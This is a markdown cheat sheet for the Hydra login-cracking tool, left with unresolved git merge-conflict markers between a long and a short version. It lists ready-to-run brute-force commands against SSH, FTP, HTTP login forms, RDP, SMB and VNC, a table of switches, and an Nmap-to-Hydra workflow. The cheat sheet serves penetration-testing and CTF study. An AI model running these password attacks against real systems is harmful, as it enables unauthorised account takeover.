<<<<<<< HEAD
# 🔥 Hydra Cheat Sheet — Bruteforce Like a Pro

Hydra is a parallelized login cracker which supports numerous protocols. It’s extremely flexible and essential in CTFs, pentests, and brute-force assessments.

## 🚀 Common Syntax

```
hydra [OPTIONS] -L user.txt -P pass.txt <protocol>://<target>
```

## 🔐 Protocols Supported (Common Ones)

- ssh
- ftp
- telnet
- http-get / http-post-form
- smb
- rdp
- vnc

---

## 🧪 Real-World Examples

### 1. SSH Brute Force

```bash
hydra -L users.txt -P passwords.txt ssh://192.168.1.111
```

### 2. FTP Brute Force

```bash
hydra -L user.txt -P pass.txt ftp://192.168.1.100
```

### 3. HTTP POST Form Attack (Example: login.php)

```bash
hydra -l admin -P rockyou.txt 192.168.1.50 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

- Adjust `F=` to match the failure response in the page.

### 4. RDP Brute Force

```bash
hydra -t 1 -V -f -l administrator -P pass.txt rdp://192.168.1.10
```

### 5. SMB Brute Force

```bash
hydra -L users.txt -P passwords.txt smb://192.168.1.20
```

### 6. VNC with No Password

```bash
hydra -P /usr/share/wordlists/nmap.lst -t 4 -vV -f 192.168.1.33 vnc
```

### 7. Custom Port

```bash
hydra -L user.txt -P pass.txt -s 2222 ssh://192.168.1.111
```

---

## ⚙️ Useful Switches

| Switch      | Description                              |
|-------------|------------------------------------------|
| `-L`        | User list file                            |
| `-P`        | Password list file                        |
| `-t`        | Number of parallel tasks (default 16)     |
| `-f`        | Exit after first found login              |
| `-V`        | Verbose (shows attempts)                  |
| `-vV`       | Very verbose                              |
| `-s`        | Specify port                              |
| `-o`        | Output results to file                    |

---

## 🧠 Tips

- Always check the target’s protocol version (e.g., SSHv2 only).
- If HTTP/S fails, manually test login and capture the POST request in Burp Suite.
- Combine Hydra with Nmap scan results for service detection.

---

## 🧵 Tool Chaining

1. Scan open ports and services with Nmap:
   ```bash
   nmap -sV -Pn 192.168.1.111
   ```
2. Use Hydra on identified services.

3. Validate hits with Medusa or manually.

=======
# Hydra Cheat Sheet

## Basic Usage
- `hydra -l user -P /path/to/wordlist.txt host ssh`
>>>>>>> c251b9ded9ccaf3883abc2e8e4d5a2e64a269b54
